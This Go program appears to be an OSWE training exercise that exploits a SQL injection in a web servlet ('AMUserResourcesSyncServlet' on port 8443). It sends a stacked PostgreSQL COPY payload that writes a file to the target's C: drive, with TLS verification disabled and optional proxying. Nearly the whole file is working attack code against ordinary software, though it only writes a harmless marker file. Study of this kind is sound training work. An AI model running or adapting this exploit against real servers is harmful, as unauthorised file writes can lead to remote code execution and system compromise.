package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"os"
	"time"

	"github.com/iPhantasmic/OSWE/scripts/utils"
)

// Ex 5.5.1.1 - Write file to system

var client *http.Client

const proxyURL = "http://127.0.0.1:8080"

func copyTo(debug bool, ip string) bool {
	payload := ";COPY+(SELECT+$$offsec$$)+to+$$c:\\\\offsec.txt$$;--+"

	// do necessary URL manipulation
	requestURL := fmt.Sprintf("https://%s:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1%s", ip, payload)

	// send the request
	utils.PrintInfo("Writing file to system...")
	start := time.Now()
	response := utils.SendGetRequest(client, debug, requestURL)

	elapsed := time.Since(start).Seconds()
	utils.PrintInfo(fmt.Sprintf("Time taken for response: %fs", elapsed))
	if response.StatusCode == 200 {
		return true
	}

	return false
}

func main() {
	var tr *http.Transport
	useProxy := flag.Bool("proxy", false, "use proxy")
	debug := flag.Bool("debug", false, "debug mode")
	flag.Parse()
	// parse args
	args := os.Args[:]
	log.Println("Args: ", args)

	if len(args) < 2 {
		utils.PrintFailure(fmt.Sprintf("usage: %s [-proxy=<proxyIP>] <target>", os.Args[0]))
		utils.PrintFailure(fmt.Sprintf("eg: %s 192.168.121.103", os.Args[0]))
		os.Exit(1)
	}

	ip := flag.Arg(0)

	if *useProxy {
		// disable TLS verification and set proxy URL
		proxyUrl, _ := url.Parse(proxyURL)
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
			Proxy:              http.ProxyURL(proxyUrl),
		}
	} else {
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
		}
	}

	// create our HTTP client using the above transport and set the global variable
	client = &http.Client{
		Transport: tr,
	}

	if copyTo(*debug, ip) {
		fmt.Println("")
		utils.PrintSuccess("Done!")
	} else {
		utils.PrintFailure("Something went wrong... Check proxy to debug!")
	}
}
